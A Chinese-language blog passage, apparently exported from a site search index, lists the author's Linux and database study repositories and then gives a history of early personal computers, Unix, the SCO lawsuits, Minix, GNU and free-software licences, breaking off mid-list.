后续的迭代，例如技术文档的更新，若已开始输出至博客，则原先在Github的仓库不再更新。 GitHub项目维护 系列 repo 说明 博客沉淀 基础系列 booboo_linux_base Linux系统基础 1 booboo_easy_service Linux简易服务 1 booboo_bash_shell_scripts LinuxBash脚本 1 booboo_mysql MySQL数据库基础 1 booboo_redis Redis数据库基础 1 booboo_oracle Oracle数据库基础 booboo_mongodb MongoDB数据库基础 booboo_service Linux服务（Web、监控、自动化运维服务） booboo_python Python开发基础 booboo_docker docker基础学习 booboo_datav datav基础学习 booboo_hadoop hadoop基础学习 进阶系列 DBA_Mysql MySQL DBA工作 DBA_redis Redis DBA工作 DBA_MongoDB MongoDB DBA工作 DBA_Linux Linux_DBA工作 DBA_python Python中高级_DBA工作 DBA_Git Git_DBA工作 DevOps-Database-Troubleshooting 数据库自动化 博客 booboowei.github.io 个人博客 考研 lianlianyouci 英语 booboo_match 数学","link":"/2020/04/14/booboo_hexo/2020-04-14-tec-hexo/"},{"title":"LINUX HISTORY","text":"如果你喜欢技术，那么Linux的学习会为你打开一个新的世界。 入门难，但是一旦入门，就简单了，加油！ 开源万岁～ 硬件发展简介x86 架构1978年6月8日，Intel发布了新款16位微处理器“8086”，也同时开创了一个新时代：x86架构诞生了。X86指令集是美国Intel公司为其第一块16位CPU(i8086)专门开发的，美国IBM公司1981年推出的世界第一台 PC机中的CPU—i8088(i8086简化版)使用的也是X86指令，同时电脑中为提高浮点数据处理能力而增加的X87芯片系列数学协处理器则另外使用X87指令，以后就将X86指令集和X87 指令集统称为X86指令集。虽然随着CPU技术的不断发展，Intel陆续研制出更新型的i80386、i80486直到今天的Pentium 4(以下简为P4)系列，但为了保证电脑能继续运行以往开发的各类应用程序以保护和继承丰富的软件资源， 所以Intel公司所生产的所有CPU仍然继续使用X86指令集，所以它的CPU仍属于X86系列。 Altair 8800世界上的第一台个人电脑–“牵牛星”　　 爱德·罗伯兹（Ed Roberts）的梦想是做一名儿科医生。但是命运却让他加入了美国空军，做一名工程师。退伍后，他在新墨西哥州的阿伯克基市机场附近的荒漠上创办了一家称为米兹（MITS）的公司，生产各种电子部件和设备。公司有一段时间的经营还算顺利。当市场上的手持计算器卖到395美元时，米兹公司推出了不到100美元的同类产品。但是不久之后，德州仪器等大公司迅速进入手持计算器的市场，产品价格大幅度下降，低到了米兹公司的成本价以下。米兹公司的其他产品销售情况也很糟。到了1974年，米兹公司已濒临破产边缘。　　 罗伯兹绞尽脑汁思考如何扭转公司的困境。他有了一个想法：能不能创造一种很便宜、能让个人使用的电脑呢？全国已经有很多电脑爱好者，他们都急切希望自己能拥有一台电脑，供个人玩弄，就像很多人在鼓捣自制的无线电收音机一样。市面上现在还没有这样的东西。带着这个想法，他去说服本地银行再给他的公司贷一笔款。米兹公司必须至少再贷将近7万美元才能不致于破产。银行对罗伯兹的想法很怀疑。双方一直谈到深夜。不过，银行面临一个两难的选择：要么不再贷款给米兹公司，让它倒闭，银行以前的投资也就全完了。要么再放一笔贷款，但这笔新贷款很可能又会打水漂。最后，银行再次让罗伯兹确切告诉他们，这种个人电脑什么时候能开发出来，第一年能卖多少套。罗伯兹对什么时候能做出来是有把握的，只要几个月的时间。能卖多少套他就完全没有谱了。于是他说了一个非常乐观的数字：第一年能卖800套，这样销售收入可以有30万美元。拿到贷款后，米兹公司全力开发个人电脑产品。公司必须在最短时间内把产品开发出来并且卖出去，不然破产就难以避免。为了缩短开发时间和降低成本，罗伯兹决定尽量采用现成的部件，做出来产品不是一台现成的计算机，而是一套零部件，需要用户自己装配。所有并非必需的产品特征都被去掉了。产品根本没有今天的微机不可忽缺的键盘、鼠标、显示器、软盘等等设备。产品也没有软件，所有软件(包括所谓的系统软件)都需要用户用设置开关的方式一条指令一条指令地手工输入计算机。　　不管多么简陋，这毕竟是世界上的第一台个人电脑，又称微机。米兹公司的微机产品有两个在当时无可比拟的优点。它很便宜，售价只有不到500美元，而当时一些大公司的实验室也做了类似微机的系统，成本在5万美元左右。另外，米兹的微机设计具有所谓的可扩展能力。用户可以将米兹的微机买回来后，自己再想法配上更多的内存板子和外部设备。有一个用户花了近500美元买了一台微机，再花了3000美元把内存扩展到12KB。《电子科普》（Popular Electronics）杂志听到这个消息后，敏锐地感觉到这是一个历史性的事件，马上决定在1975年1月期作为封面文章报道。但这个个人电脑产品却连名字都还没有。罗伯兹在杂志的责任编辑家里讨论了各种名字。刚好，编辑的家人正在看《星际旅行》的电视节目。那一节刚好讲到了牵牛星座。于是，世界上第一台微机就被命名为“牵牛星”，全称是“牵牛星8800（Altair 8800）”。 罗伯兹做梦也没想到的是，全美有这么多的电脑爱好者，人人都想拥有一台微机。《电子科普》杂志的报道发表后一个月，米兹公司每天都要收到200多台“牵牛星”电脑的订单。生产线根本来不及满足销售需求。有些用户干脆住到公司外面的荒漠上，等着自己的微机生产出来。大多数用户只是购买基本系统。也有用户愿意出495美元，让米兹公司生产一台已经装配好的系统。　　 今天，罗伯兹已经离开了电脑界。他回到乔治亚的老家，获得了医学博士学位，为儿童治病。他为自己创造了计算机领域的一个革命而自豪，但一点也不后悔放弃电脑业，放弃了成为大富翁的机会。他觉得为儿童治病更有意义。爱德·罗伯兹是个很幸福的人，他实现了儿时的梦想。 IBM5150IBM推出世界上第一台个人电脑 1981年8月12日，总部设在美国纽约州阿蒙克的国际商用机器公司（IBM）推出5150的新款电脑，“个人电脑”这个新生市场随之诞生。IBM5150看起来像个米色的“大盒子”，售价1565美元，只有16K字节的内存，可以使用盒式录音磁带来下载和存储数据，此外也可配备5.25英寸的软件盘驱动器。 MOS Technology 6502当一个满脸横肉的怪人将这个微芯片装在电脑上，并启动电脑时，整个宇宙都震惊了。这个怪人就是苹果公司创始人之一——斯蒂芬·沃兹尼克，那台电脑就是Apple I，处理器用的是由摩斯太克公司研发的8位微处理器6502。 这一处理器同时也是Apple II、the Commodore PET、BBC Micro等经典电脑以及诸如任天堂和Atari等游戏系统的大脑。该处理器的设计者之一Chuck Peddle回忆称，他们是在1975年的一个贸易展示会上推出这款处理器的。他称：“我们用芯片装满了两个玻璃。我和我的妻子就坐在那里卖这些芯片。”摩斯太克公司6502微处理器终于脱颖而出，其原因是，6502的速度并不比它的竞争对手快多少，但是它的价格便宜，每部售价为25美元，而英特尔的8080和摩托罗拉的6800售价大约在200美元。 操作系统简介UnixUnix 简史1965年时，贝尔实验室(Bell Labs)加入一项由奇异电子(General Electric)和麻省理工学院(MIT)合作的计划；该计划要建立一套多使用者、多任务、多层次(multi-user、multiprocessor、multi-level)的MULTICS操作系统。直到1969年，因MULTICS计划的工作进度太慢，该计划就被停了下来。当时，Ken Thompson（后被称为Unix之父）已经有一个称为「星际旅行」的程序在GE-635的机器上跑，但是反应非常的慢，正巧也被他发现了一部被闲置的PDP-7(Digital的主机)，Ken Thompson和Dernis Ritchie就将「星际旅行」的程序移植到PDP-7上。而这部PDP-7就此在整个计算机历史上留下了芳名。 MULTICS 其实是”MULTiplexed Information and Computing System”的缩写，在1970年时，那部PDP-7却只能支持两个使用者，当时，Brian Kernighan 就开玩笑地戏称他们的系统其实是：”UNiplexed Information and Computing System”，缩写为”UNICS”，后来，大家取其谐音，就称其为”Unix”了。1970年可称为是Unix元年。 1971年，他们申请了一部PDP-11/20，申请的名义是：要发展文书处理系统。该提案被获采纳，他们也发展出了一套文书处理系统 ─ 就是现在Unix操作系统里面文书处理系统(nroff/troff)的前身。有趣的是，没有多久，贝尔实验室的专利部门真的采用了这套系统作为他们处理文件的工具，而贝尔实验室的专利部门也就顺理成章地成为Unix的第一个正式使用者。当时，那部PDP-11／20只有0.5MB磁盘空间。而描述这整个系统的文件被标示为：”First Edition”，版本日期是1970年11月。从此以后，Unix的版本就以系统文件的版别来称呼。 UNIX家谱UNIX的历史开始于1969年ken Thompson，Dennis Ritchie（即著名的K&amp;G，C语言的发明人）与一群人在一部PDP-7上进行的一些工作，后来这个系统变成了UNIX。它主要的几个版本为： V1（1971）：第一版的UNIX，以PDP-11/20的汇编语言写成。包括文件系统，fork、roff、ed等软件。 V4（1973）：以C语言从头写过，这使得UNIX修改容易，可以在几个月内移植到新的硬件平台上。最初C语言是为UNIX设计的，所以C与UNIX间有紧密的关系。 V6（1975）：第一个在贝尔实验室外（尤其是大学中）广为流传的UNIX版本。这也是UNIX分支的起点与广受欢迎的开始。1.xBSD （PDP-II）就是由这个版本衍生出来的。 V7（1979）：在许多UNIX玩家的心目中，这是“最后一个真正的UNIX，”这个版本包括一个完整的K&amp;RC编译器，Bourne shell。V7移植到VAX机器后称为32V。 目前开发UNIX（System V）的公司是Unix System Laboratories (USL)。USL本为AT&amp;T所有，1993年初被Novell收购。Novell于1993年末将UNIX这个注册商标转让给X/Open组织。 目前为止，UNIX有两大流派：那就是AT&amp;T发布的UNIX操作系统System V与美国加州大学伯克利分校发布的UNIX版BSD（Berkeley Software Distribution）。SVR4是两大流派融合后的产物。1991年底，与System V针锋相对的开放软件基金会(Open Software Foundation)推出了OSF/1。 现在几种主要的UNIX版本: AIX：IBM的UNIX，是根据SVR2（最近已经出到SVR3.2）以及一部分BSD延伸而来，加上各种硬件的支持。具备特有的系统管理（SMIT）。 386BSD：Jolitz从Net/2 software移植过来的。支持Posix，32位。 FreeBSD：1.x从386BSD 0.1而来，FreeBSD 2.x版是用4.4BSD lite改写。 HP-UX（HP）：旧系统是从S III（SVRx）发展面来，现在是由SVR2（4.2BSD）发展而来，目前是10.x版。 Linux(x86)：遵从POSIX，SYSV及BSD的扩展，这一点从上页表中即可看出。 OSF/1（DEC）：DEC对OSF/1的移植。 SCO UNIX（x86）：SVR3.2，目前影响较大的PC UNIX。 SunOS（680x0，Sparc，i386）：根据4.3BSD，包含许多来自System V的东西。Sun的主要成果在于：NFS，OpenLook GUI标准，后来演变为Solaris 。这也是目前最著名的UNIX版本之一。 Ultrix(DEC)：根据4.2BSD再加上许多4.3BSD的东西。 Xenix(x86)：Intel硬件平台上的UNIX，以SVR2为基础，由微软推出。在中国使用较广泛。 黑暗史Unix与Linux，SCO与IBM、微软，他们是怎样纠结在一起，形成一团解不开的乱麻？ 风起Unix1969年“阿波罗11号”登月成功。贝尔实验室中一个叫Ken Thompson的年轻人为了一圆翱游太空的梦想，在当时的Multics系统上写了一个叫《星际之旅》的游戏。但当时大型机的机时费很贵，每玩一次公司就要为此支付75美金，于是Thompson打起了小型机PDP-7的主意。但当时的PDP-7只有一个简陋的运行时系统，不支持多用户，为了能双人对战，Thompson找来Dennis Ritchie一起开发新的作系统。他们只花了一个月的时间就用汇编语言写出了作系统的原型。“你写的系统太差劲，干脆就叫Unics算了。”60年代末的一天，贝尔实验室的一位同事对肯·汤普生这样说。同事布莱恩·科尔尼干 Brian W.Kernighan看到后，戏称这个系统为Unics②。Unix这个名字典出于此。 在英文里，Unics发音与Eunuchs一样，而后者的意思是“太监”。汤普生接下同事的嘲弄，稍作修改，把自己研发的系统叫做Unix。 1971年，Unix已经能够支持两名用户在PDP-11上玩《星际之旅》了，但因为当时的Unix是用汇编语言写的，无法移植到其他机器上，所以他们决定用高级语言重写Unix，可当时的高级语言无论从运行效率还是功能上都无法满足他们的需要。Thompson先是在BCPL的基础上萃取出了B语言，Ritchie又在B的基础上进行了重新设计，这才有了今天大名鼎鼎的C语言。 60年代的计算机虽然已不是庞然大物了，但体积仍然不小，而且爱出故障。汤普生回忆：“计算让人着迷，电子也让人着迷，只是不太干净，很脏，因为经常有东西被烧坏。” 操作这些又慢、又笨的大家伙需要专业的计算机程序员，为了提高效率，急需新系统。在这种背景下，汤普生和丹尼斯·利奇研发了Unix操作系统。此时，乔布斯和盖茨还在中学里搞恶作剧，PC和微软操作系统要在10年后才初露端倪。 Unix两位创始人和贝尔实验室也没把这套操作系统太当回事，只是在内部使用，后来大学、研究机构也可以免费使用，而且还提供给他们源代码，因此Unix源代码被广为扩散。在这段时间里，它没有像后来的商业软件那样急功近利，留下一堆窟窿和补丁，因此，Unix在诞生后的10年里“养在深闺人未识”，在实验室进行着充分的使用和论证，这也是它后来在要求稳定性、安全性较高的企业级客户中得到推崇的主要原因。 到了1980年，Unix开始走出实验室，有数以千计的技术高手想把Unix装在家里的机器上。 此时，后知后觉的贝尔实验室开始认识到Unix的价值，但由于源代码早已外散，无法将其拢起来进行精细的商业开发，于是干脆采取对外授权的模式，研究机构使用免费，企业使用要交授权费，这有些金矿当做铜矿卖的味道。一位贝尔高级主管曾感慨：“Unix是继晶体管以后的第二个最重要发明。”但贝尔实验室错失商业发展机遇。 “幸运的时机好比市场上的交易，只要你稍有延误，它就掉价了。”培根在《论时机》中这样写到。当时有多家大学、研究机构和公司获得了Unix授权，并由此开始了各自不同的版本演化之路。1993年，拥有贝尔实验室的美国电话电报公司（AT&amp;T）将自己所拥有的Unix权利卖给Novell，后者成为接受Unix衣钵的合法继承人。当然此时的IBM、DEC、HP和Sun因为早年的授权缘故，有权继续进行各自的Unix版本的研发。 1995年，Novell又将Unix相关资产卖给SCO。和两年前AT&amp;T把Unix卖给Novell一把清的局面有所不同，SCO当时没有足够的现金一次性付清，因此Novell初期只是把Unix源代码交给了SCO，对于Unix著作权的归属协议存在着语焉不详和模棱两可的地方。 花了钱的SCO宣传自己是Unix正宗传人，Novell当时视Unix为鸡肋，没有异议，而且此时SCO没有对别的获得过Unix授权的厂商置喙，于是大家进入了一段相安无事的时期。 微软的进进出出八十年代末，有人问比尔·盖茨怎么看待Unix与微软构成的竞争，他笑着问道：“哪个Unix？”微软与Unix的关系源远流长，并对SCO的演变起了重要的催化作用。1979年，微软从美国电话电报公司获得授权，为Intel处理器所开发一种Unix操作系统，由于它购买的授权无法直接让该操作系统以“Unix”为名，于是该系统命名为Xenix，可用在个人电脑及微型计算机上使用。微软并不直接把Xenix销售给终端客户，而是以OEM的形式再授权给Intel、Tandy、施乐Altos及SCO公司。 对于微软来说，由于需要从美国电话电报公司获得授权，因而这是一种自己难以把握其未来发展命运的操作系统，而且当时其他厂商不同的版本在搅浑这个市场，所以，盖茨在寻找机会退出这个领域。当微软和IBM达成开发OS/2操作系统的协议后，盖茨便失去了推广Xenix的兴趣。 多年后的历史资料揭秘显示，微软当时脚踩多条船，除和IBM联手开发OS/2操作系统外，微软还在紧锣密鼓地进行着Windows 3.0系统的研发。微软不可能在三条线上同时投入精力，于是决定舍弃Xenix操作系统。 “赛车和做人一样，有时候要停，有时候要冲。”这是电视剧《极速传说》中的一句台词。1987年，微软与SCO达成了一项协议，以持有后者股票25%的条件转让了Xenix的所有权。从微软接盘的SCO，将这种操作系统以最快速度移植到386电脑，成为首款支持Intel386芯片的操作系统，抓住了市场的先机。 当时的市场格局是这样，小型机加五花八门的Unix操作系统把持了高端的企业级用户市场，其中的代表厂商是IBM、DEC、惠普、SUN、SGI等；Intel芯片加微软操作系统，正在全面控制个人电脑市场，其中的代表厂商包括康柏、AST、佰德等。小型机加Unix操作系统的阵营鄙视Intel芯片加微软操作系统形成的Wintel联盟，前者认为后者简陋，而后者则认为前者是老化顽固。 SCO此时扮演的角色有点像“蝙蝠”，非鸟非兽，它的运营模式是Intel芯片加Unix操作系统，在两大阵营间翩翩飞。随着装有Intel芯片电脑的攻城略地，SCO也跟着分到一杯羹。80年代末，有媒体称Xenix为“可能是传播最广的UNIX操作系统”。 SCO进入了其发展史上最辉煌的时期。当然这段时间，Unix的发展也进入了黄金期。1984年9月《财富》杂志称，全球范围内750所大学中80％的计算机领域的教授是Unix用户，因此当时计算机专业毕业的学生都接触过Unix，他们毕业后成为IT领域的骨干。 盖茨抛弃了Unix，但没打算抛弃这块丰饶的市场，而且SCO的成功也刺激了他：自己扔掉的一块鸡肋竟然成了这个小跟班的肥美牛排。换谁不流口水啊？有句谚语是“别让口馋的人看见你的大碗”。 Unix有个致命缺陷：从来就没有通用版存在。多年以来，由于早期混乱的授权，五花八门、不同版本的Unix遍地开花，所以为其中一个版本写的应用程序，常常要修改后才能运用到另一个上，这对于专业的程序员来说也许不是太大问题，但对技术实力较弱的用户来说，则平添了许多麻烦。 从Unix脱身而出的盖茨深知其支离破碎的弱点，他下令微软打造一款“可移植的”的操作系统——“Unix杀手”。这就是微软的Windows NT，包括SCO在内的Unix阵营将感受到它带来的巨大压力。 歌手鲍勃·迪伦在《时代在转变》一诗中写到：“动笔预言世事的作家与评论家们，张大你们的双眼，机会不会再来第二遍，轮盘还在旋转，先别言之过先，看不出来谁会被选，因为目前的输家未来会领先，因为时代正在改变。” 强悍对手逆袭“我不会用狗屎去污染（NT）”。Windows NT研发负责人大卫·卡特勒这样高声地嚷着，他拒绝允诺新一代的操作系统兼容已有的DOS和Windows。原来，定下“Unix杀手”计划后，盖茨准备组织一个团队来完成这项工作。“我太想要一个可移植的操作系统了，”盖茨说，“问题不在于我们是否应该组成团队，而在于何时能组成团队去开发它。” 随后机会来了，DEC的核心工程师卡特勒因在公司坐冷板凳而萌生去意。“大多数人学会如何把一件事做得很漂亮以后，便一生一直做这个，”卡特勒一个同事评价他：“卡特勒会从自己的成功中学习。下一次，他会做得更好。所以每次，他都上升到一个新的高度。” 卡特勒全身心地投入程序开发，而冷落了两任妻子，后来他发誓再也不会结婚，“结婚是一个错误，你只能犯两次错”。卡特勒在程序开发上精益求精，“对可能干扰他的任何人和事，他不仅置之不理，而且还会对其进行攻击和诋毁”，因此，他与DEC公司高管们相处得很不愉快。 盖茨亲自拜会卡特勒，想让他加盟微软。初次见面，卡特勒就给盖茨一个下马威，直言不讳地称微软的代码写得很“烂”，认为盖茨当时捧在手心里的、深以为傲的DOS，在他的眼里就是一个玩具。卡特勒说只有自己才有能力开发出一个能面向未来进行网络管理、具有高可靠性的操作系统。 此时的盖茨已走过创业期，拥有海量的财富与强势的权力，耳边吹过的都是“软件神童”的悦耳之音。不过，卡特勒的刺耳之音和轻蔑态度反而坚定了盖茨聘请他的决心，盖茨向对方表示将给予充分的发展空间和自由。励志大师戴尔·肯耐基说：“在世界上，要影响别人的惟一办法就是谈论他们的需要，并告诉他们去如何满足这些需要。” 卡特勒到微软之后，盖茨尽可能地满足他的要求，有些甚至是打破微软惯例的。譬如卡特勒不要微软原来的工程师参与他的团队，他把自己在DEC工作时的团队带了过来，其中有些是硬件工程师，是卡特勒的好友。盖茨原来不打算要，但卡特勒威胁不让他们来，自己就不来。 盖茨让步，满足了卡特勒所需要的一切。此前，控制欲极强的盖茨会亲自检查微软的大部分代码，在他刨根揭底地穷问下，程序员有时会露出破绽，这时盖茨会不留情面地痛斥，带有攻击性言语，譬如“这是有史以来最愚蠢的代码”会劈头盖脸地砸过去。但盖茨对卡特勒的项目则放手到几乎“放任自流”的地步。Airbnb联合创始人兼CEO布莱恩·切斯基说过：“你有时候必须靠边站，如果你要插手细节，你会很痛苦。但是你要是站得远一点，你就能看清大局。” 盖茨识才的眼光和用人不疑的态度，最终得到了丰厚的回报，1993年，Windows NT完美亮相，成为微软撬动Unix市场的一把利器。卡特勒也获得了Windows NT之父的赞誉，在微软发展史上占有一席之地。罗杰•福尔克在《漫谈企业管理》中提到：“一个人只有处在最能发挥其才能的岗位上，他才会干得最好。”盖茨自己在这一时期说过：“对我来说，跟一伙聪明的工程师一起工作，研发出产品，然后你走出去看到人们确实在使用它们，这才是更大的乐趣所在。” 在包括SCO在内的Unix阵营开足马力贬低Windows NT之时，Windows NT却在高端市场上大步前进，SCO则开始走下坡路。 “节物风光不相待，桑田碧海须臾改。”在微软与Unix阵营的对手进行车轮战的同时，一股新的力量在生成并变得强大起来，左右了战局的发展方向。这就是Linux。 起初盖茨认为Linux无足轻重，但大量的用户不这样认为，他们对Linux投去青睐的目光，因为Linux公开授权，允许用户销售、拷贝并且改动程序，只不过要求修改后的代码也免费公开，这些举措成了Linux蔓延的强大推力，并给微软带来了强烈的冲击。 Linux的存在给了对微软一直心存敌意的对手们一把雪耻的利刃，包括IBM、Oracle、Sun等业界大鳄，纷纷表示扶持Linux，并以各种方式支持Linux，向陷住微软战靴的泥潭灌进去更多的水。微软一度陷入了被动的局面。但随着Linux的发展，战局发生了微妙的变化。 在一个公开场合，盖茨表示：“受到Linux蚕食的是Unix，而不是Windows。”他说：“我们确实在与Linux竞争，但转换到Linux的Unix市场是相当可观的。Windows和Linux将共同主导市场。” 市场分析机构Gartner也宣称，Linux和开放源代码会继续发展，但它们所掠夺的是Unix而不是微软的领地。与Unix有着千丝万缕联系的Linux，竟然扮演了Unix终结者的角色？ 这是因为Unix操作系统价格比微软的产品更高，市场份额也更少，受到Linux的冲击也更大，靠着Unix吃饭的SCO对此感同身受。一位Linux厂商技术总监曾放话：“SCO Unix的生命周期已经结束了，系统移植是必然的。” 与其坐以待毙，不如奋力一击。进入21世纪后，日渐式微的SCO开始策划一出震惊IT业界的大戏。 车轮诉讼大战“在过去的18个月，我们发现IBM把一些极其高端的企业运算技术的源代码公开了。其中部分看上去与我们拥有知识产权的技术非常相似，违反了我们与IBM之间的协议。他们的行为之间破坏了我们之间不公开这部分技术的协议，单方面公开了源代码。我们有证据表明部分代码是逐字的抄袭。”2003年5月，SCO的CEO达尔·麦克布莱德这样说。 SCO控告IBM的Linux破坏了双方之前签订的软件代码授权协议，声称IBM免费散发有知识产权的代码，把一些Unix的代码改头换面后加入Linux产品中，因此要求蓝色巨人赔偿自己10亿美元。“初寒冻巨海，杀气流大荒。”此举在Linux阵营炸开了锅，他们认为SCO此举为“项庄舞剑，意在沛公”，最终目标是挟制整个Linux阵营。 随后，微软的动作让这个局面变得混乱起来。起诉IBM后不久，SCO宣布向微软发放Unix技术许可，包括专利权和源代码。就是说，微软以花钱买购买SCO的Unix技术许可权的方式，承认了对方Unix合法传人的地位。 布鲁斯·佩伦斯称：“对于微软来说，购买SCO的源代码授权几乎没有任何意义。花钱购买SCO公司的授权，只不过是对一种‘行贿’行为的粉饰，顺便还对未来的Linux用户进行恫吓。可谓一石双鸟！很难想象微软的前对手SCO能为比尔·盖茨冲锋陷阵，但是，微软的钱改变了一切。” Linux阵营担心的就是这一点，微软此举强化了SCO的Unix“权威地位”，增强了SCO挑战IBM的决心。一旦SCO拿下IBM，就打开了一个收钱口袋，其他推行Linux的厂商只有乖乖纳贡。 而且使用Linux的广大商业用户也面临着被追索的危机，更多的潜在用户将会对Linux望而生畏，这非常符合微软一直针对Linux实施的心理战战术，让用户在恐惧、不确定、怀疑的状态下对Linux敬而远之。考虑到历史上微软与SCO复杂的关系，人们怀疑二者在密谋，认为SCO在扮演为微软火中取栗的角色。2004年初，麦克布莱德警告：全球一些大公司由于使用了Linux将可能很快面临诉讼，其中包括英国石油、西门子和富士通。就是说，SCO的诉讼风暴即将席卷全球。 借着SCO对Linux阵营的压力，2004年11月，微软CEO鲍尔默在新加坡举行的一个高级别政府论坛上表示，Linux侵犯了至少228项专利，不过他并没有明确表示侵犯了哪些专利。他说：“对于那些已经加入世界贸易组织的国家而言，使用Linux就意味着有一天会有人过来向你收取专利费。” 2005年1月，美国法院判决IBM交出20亿行的程序代码给SCO，消息传出后，SCO股价暴涨20%。 SCO似乎可以动手敛钱了，然而风云又变，半路杀出一个程咬金。Novell公司站了出来，称自己才是Unix版权的合法拥有者，说自己当年没有把Unix版权卖给SCO，SCO也只是个授权使用者，并且要对方把从微软和Sun收到的授权许可费给吐出来。 于是，SCO又和Novell公司干上了，开始了法庭上的互有胜负的对峙。 树敌过多后的破产“SCO公司在诉讼过程中树敌过多。”业内人士温伯格这样表示。连年诉讼耗尽了SCO资源，公司重点也没有放在业务上，话又说回来，其Unix业务已日薄西山，也没啥好继续开展的了。 2007年8月，美国犹他州地方法院一名法官裁定，Unix操作系统的版权归属于Novell，而不是SCO。这意味着SCO需要向Novell支付数百万美元的赔偿。 此举也意味着，SCO在与IBM进行的法律大战中失去胜算。Linux阵营头顶的乌云也随即散去。这年12月27日，SCO正式被纳斯达克摘牌。 芥川龙之介说过：人生好比一盒火柴，严禁使用是愚蠢的，滥用则是危险的。 MinixMinix原来是荷兰阿姆斯特丹的Vrije大学计算机科学系的Andrew S. Tanenbaum教授所发展的一个类Unix操作系统。全部的程序码共约12,000行，并置于他的著作Operating Systems: Design andImplementation(ISBN 0-13-637331-3)的附录里作为范例。Minix的系统要求在当时来说非常简单，只要三片磁片就可以启动。Minix原始是设计给1980年代到1990年代的IBM PC和IBM PC/AT兼容电脑上执行。1.5版也有移植到以Motorola 68000系列CPU为基础的电脑上（如Atari ST，Amiga，和早期的Apple Macintosh）和以SPARC为基础的机器（如升阳sun公司的工作站）。2.0版则只有x86架构的版本。 因为AT&amp;T的政策改变，在Version 7 Unix推出之后，发布新的使用条款，将UNIX源代码私有化，在大学中不再能使用UNIX源代码。塔能鲍姆教授为了能在课堂上教授学生操作系统运作的实务细节，决定在不使用任何AT&amp;T的源代码前提下，自行开发与UNIX兼容的操作系统，以避免版权上的争议。他以小型UNIX（mini-UNIX）之意，将它称为MINIX。 全套Minix除了起动的部份以汇编语言编写以外，其他大部份都是纯粹用C语言编写。分为：内核、内存管理及档案管理三部份。 与Linux的关系如果想了解类Unix系统的内部工作情况，学生可以在他们自己的电脑上运行Minix。据报道，即使是毫无经验的学生也能在几个月的典型培训课程的学习中获得对整个系统的很好的了解。Minix最有名的学生用户是Linus Torvalds，他在芬兰的赫尔辛基大学用Minix操作平台建立了一个新的操作系统的内核，他把它叫做Linux。 Linux是其作者受到Minix的影响而作成的（Linus Torvalds不喜欢他的386电脑上的MS-DOS操作系统，安装了Minix，并以它为样本开发了原始的Linux内核）。但在设计哲学上，Linux则和Minix大相迳庭。Minix在内核设计上采用微内核的原则，但Linux则和原始的Unix相同都采用宏内核的概念。在Linux发展之初，双方还于1992年在新闻组上有过一场精彩的理念争论。Minix的作者和支持者认为Linux的单内核构造是“向七十年代的大倒退”，而Linux的支持者认为Minix本身没有实用性。 授权方式在授权方式上，Minix的版权宣告在早期被认为是相当自由的，在作者Andrew S. Tanenbaum希望拿Minix作为一个公开的教材与出版社希望保护程序码著作财产权的平衡下，它只要求一个相当低的授权费。但因为它并不是一个开放源码的授权方案，所以志愿工作者在以GPL方式散布的Linux核心出现后就多转向Linux平台。而Unix也在柏克莱系统与AT&amp;T达成协议后，出现了以BSD 授权散布的FreeBSD开放平台。Minix虽然在2000年改用BSD 授权，但这时其它的操作系统在功能上大幅超越了它，而它失去了发展成一个广泛使用的操作系统的机会，只留下，如它的作者Andrew S. Tanenbaum，原来期望的，作为一个开放的教材的用途。 GUNGNU计划，又称革奴计划，是由Richard Stallman在1983年9月27日公开发起的。它的目标是创建一套完全自由的操作系统。Richard Stallman最早是在net.unix-wizards新闻组上公布该消息，并附带《GNU宣言》等解释为何发起该计划的文章，其中一个理由就是要“重现当年软件界合作互助的团结精神”。为保证GNU软件可以自由地“使用、复制、修改和发布”，所有GNU软件都有一份在禁止其他人添加任何限制的情况下授权所有权利给任何人的协议条款，GNU通用公共许可证（GNU General PublicLicense，GPL）。即“反版权”（或称Copyleft）概念。 历史1985年Richard Stallman又创立了自由软件基金会（Free Software Foundation）来为GNU计划提供技术、法律以及财政支持。尽管GNU计划大部分时候是由个人自愿无偿贡献，但FSF有时还是会聘请程序员帮助编写。当GNU计划开始逐渐获得成功时，一些商业公司开始介入开发和技术支持。当中最著名的就是之后被Red Hat兼并的Cygnus Solutions。 到了1990年，GNU计划已经开发出的软件包括了一个功能强大的文字编辑器Emacs[1] 。GCC（GNUCompiler Collection，GNU编译器集合），是一套由 GNU 开发的编程语言编译器。以及大部分UNIX系统GNU操作系统的内核Linux的程序库和工具。唯一依然没有完成的重要组件就是操作系统的内核(称为HURD)。 1991年Linus Torvalds编写出了与UNIX兼容的Linux操作系统内核并在GPL条款下发布。Linux之后在网上广泛流传，许多程序员参与了开发与修改。1992年Linux与其他GNU软件结合，完全自由的操作系统正式诞生。该操作系统往往被称为“GNU/Linux”或简称Linux。（尽管如此GNU计划自己的内核Hurd依然在开发中，已经发布Beta版本。） 许多UNIX系统上也安装了GNU软件，因为GNU软件的质量比之前UNIX的软件还要好。GNU工具还被广泛地移植到Windows和Mac OS上。 协议条款GNU 包含3个协议条款: GPL：GNU通用公共许可证（GNU General Public License） LGPL：GNU较宽松公共许可证 (GNU Lesser General Public License）, ) ，旧称 GNU Library General Public License (GNU 库通用公共许可证)； GFDL ： GNU自由文档许可证（GNU Free Documentation License ）的缩写形式。 这里指的自由，并不是价格免费，这和价格无关而是使用软件对所有的用户来说是自由的。 通过如下途径实现这一目标： 它要求软件以源代码的形式发布，并规定任何用户能够以源代码的形式将软件复制或发布给别的用户。 如果用户的软件使用了受 GPL 保护的任何软件的一部分，那么该软件就继承了 GPL 软件，并因此而成为 GPL 软件，也就是说必须随应用程序一起发布源代码。 GPL 并不排斥对自由软件进行商业性质的包装和发行，也不限制在自由软件的基础上打包发行其他非自由软件。 由于GPL很难被商业软件所应用，它要求调用它的库的代码也得GPL，全部开放，并且一同发布，不能直接连接。所以后来GNU推出了LGPL许可证 在GPL与LGPL许可证保护下发布源代码的结果很相似，对旧代码所做的任何修改对于想知道这些代码的人必须是公开的，唯一真正的不同之处在于私人版权代码是否可以与开放源代码相互连接，LGPL允许实体连接私人代码到开放源代码，并可以在任何形式下发布这些合成的二进制代码。只要这些代码是动态连接的就没有限制。（使用动态链接时，即使是程序在运行中调用函数库中的函数时，应用程序本身和函数库也是不同的实体） 自由软件“自由软件” 是权利问题，不是价格问题。要理解这个概念，自由应该是“言论自由”中的“自由”，而不是“免费啤酒”中的“免费”。 自由软件关乎使用者运行、复制、发布、研究、修改和改进该软件的自由。 更精确地说，自由软件赋予软件使用者四种自由： 不论目的为何，有运行该软件的自由（自由之零）。 有研究该软件如何运行，以及按需改写该软件的自由（自由之一）。取得该软件源代码为达成此目的之前提。 有重新发布拷贝的自由，这样你可以借此来敦亲睦邻（自由之二）。 